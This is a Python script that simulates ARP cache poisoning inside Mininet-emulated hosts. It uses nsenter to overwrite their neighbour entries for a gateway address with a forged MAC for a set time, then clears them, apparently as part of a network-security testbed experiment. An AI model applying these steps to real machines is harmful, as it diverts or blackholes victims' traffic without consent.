#!/usr/bin/env python3
"""
Directly poisons ARP cache inside Mininet host namespaces.
Must be run as root from outside Mininet.
"""
import subprocess, time, sys, os

FORGED_MAC = "de:ad:be:ef:ca:fe"
TARGET_IP  = "10.0.3.1"
VICTIMS    = ["gc1", "gc2"]
DURATION   = int(sys.argv[1]) if len(sys.argv) > 1 else 40

def get_pid(host):
    result = subprocess.run(
        ["pgrep", "-f", f"mininet:{host}"],
        capture_output=True, text=True
    )
    pids = result.stdout.strip().split()
    return pids[0] if pids else None

def poison(host):
    pid = get_pid(host)
    if not pid:
        print(f"[!] Could not find {host} namespace")
        return
    iface = f"{host}-eth0"
    cmd = [
        "nsenter", "-t", pid, "-n",
        "ip", "neigh", "replace",
        TARGET_IP, "lladdr", FORGED_MAC,
        "dev", iface, "nud", "permanent"
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode == 0:
        print(f"[+] Poisoned {host}: {TARGET_IP} -> {FORGED_MAC}")
    else:
        # fallback: try arp command
        cmd2 = ["nsenter", "-t", pid, "-n", "arp", "-s", TARGET_IP, FORGED_MAC]
        subprocess.run(cmd2)

end = time.time() + DURATION
print(f"[*] Poisoning ARP caches for {DURATION}s...")
while time.time() < end:
    for victim in VICTIMS:
        poison(victim)
    time.sleep(1)

print("[*] Restoring ARP caches...")
for victim in VICTIMS:
    pid = get_pid(victim)
    if pid:
        subprocess.run([
            "nsenter", "-t", pid, "-n",
            "ip", "neigh", "del", TARGET_IP, "dev", f"{victim}-eth0"
        ], capture_output=True)
